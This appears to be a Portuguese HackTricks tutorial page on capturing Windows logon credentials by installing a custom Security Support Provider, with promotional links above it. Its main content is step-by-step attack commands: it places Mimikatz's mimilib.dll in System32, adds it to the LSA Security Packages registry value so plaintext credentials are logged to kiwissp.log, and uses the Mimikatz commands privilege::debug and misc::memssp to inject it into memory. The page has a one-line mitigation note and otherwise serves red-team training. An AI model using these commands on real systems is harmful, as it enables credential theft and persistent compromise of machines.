<details>

<summary><strong>Aprenda hacking AWS do zero ao herói com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras maneiras de apoiar o HackTricks:

* Se você quiser ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF** Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**swag oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Junte-se ao** 💬 [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-nos** no **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Compartilhe seus truques de hacking enviando PRs para o** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repositórios do github.

</details>


## SSP Personalizado

[Aprenda o que é um SSP (Provedor de Suporte de Segurança) aqui.](../authentication-credentials-uac-and-efs.md#security-support-provider-interface-sspi)\
Você pode criar seu **próprio SSP** para **capturar** em **texto claro** as **credenciais** usadas para acessar a máquina.

### Mimilib

Você pode usar o binário `mimilib.dll` fornecido pelo Mimikatz. **Isso registrará em um arquivo todas as credenciais em texto claro.**\
Solte o dll em `C:\Windows\System32\`\
Obtenha uma lista de Pacotes de Segurança LSA existentes:

{% code title="atacante@alvo" %}
```bash
PS C:\> reg query hklm\system\currentcontrolset\control\lsa\ /v "Security Packages"

HKEY_LOCAL_MACHINE\system\currentcontrolset\control\lsa
Security Packages    REG_MULTI_SZ    kerberos\0msv1_0\0schannel\0wdigest\0tspkg\0pku2u
```
Adicione `mimilib.dll` à lista do Fornecedor de Suporte de Segurança (Security Support Provider list - Security Packages):
```powershell
reg add "hklm\system\currentcontrolset\control\lsa\" /v "Security Packages"
```
E após reiniciar, todas as credenciais podem ser encontradas em texto claro em `C:\Windows\System32\kiwissp.log`

### Na memória

Você também pode injetar isso diretamente na memória usando o Mimikatz (observe que pode ser um pouco instável/não funcionar):
```powershell
privilege::debug
misc::memssp
```
Isso não sobreviverá a reinicializações.

### Mitigação

ID do Evento 4657 - Auditoria da criação/mudança de `HKLM:\System\CurrentControlSet\Control\Lsa\SecurityPackages`
